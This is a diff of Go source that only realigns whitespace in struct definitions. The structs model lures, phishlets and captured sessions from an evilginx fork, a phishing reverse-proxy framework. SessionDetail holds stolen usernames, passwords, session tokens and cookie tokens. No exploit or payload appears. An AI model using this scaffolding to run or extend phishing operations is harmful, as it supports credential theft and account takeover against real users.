@@ -72,7 +72,7 @@ type Lure struct {
 	Id              string `json:"id"`
 	Hostname        string `json:"hostname"`
 	Path            string `json:"path"`
-	URL            string `json:"url"`
+	URL             string `json:"url"`
 	RedirectUrl     string `json:"redirect_url"`
 	Phishlet        string `json:"phishlet"`
 	Redirector      string `json:"redirector"`
@@ -107,20 +107,20 @@ type CookieToken struct {
 
 // SessionDetail is the full view of a captured session.
 type SessionDetail struct {
-	Id           int                          `json:"id"`
-	Phishlet     string                       `json:"phishlet"`
-	LandingURL   string                       `json:"landing_url"`
-	Username     string                       `json:"username"`
-	Password     string                       `json:"password"`
-	Custom       map[string]string            `json:"custom"`
-	BodyTokens   map[string]string            `json:"body_tokens"`
-	HttpTokens   map[string]string            `json:"http_tokens"`
+	Id           int                               `json:"id"`
+	Phishlet     string                            `json:"phishlet"`
+	LandingURL   string                            `json:"landing_url"`
+	Username     string                            `json:"username"`
+	Password     string                            `json:"password"`
+	Custom       map[string]string                 `json:"custom"`
+	BodyTokens   map[string]string                 `json:"body_tokens"`
+	HttpTokens   map[string]string                 `json:"http_tokens"`
 	CookieTokens map[string]map[string]CookieToken `json:"tokens"`
-	SessionId    string                       `json:"session_id"`
-	UserAgent    string                       `json:"useragent"`
-	RemoteAddr   string                       `json:"remote_addr"`
-	CreateTime   int64                        `json:"create_time"`
-	UpdateTime   int64                        `json:"update_time"`
+	SessionId    string                            `json:"session_id"`
+	UserAgent    string                            `json:"useragent"`
+	RemoteAddr   string                            `json:"remote_addr"`
+	CreateTime   int64                             `json:"create_time"`
+	UpdateTime   int64                             `json:"update_time"`
 }
 
 // ErrorResponse is the error payload produced by the evilginx fork.
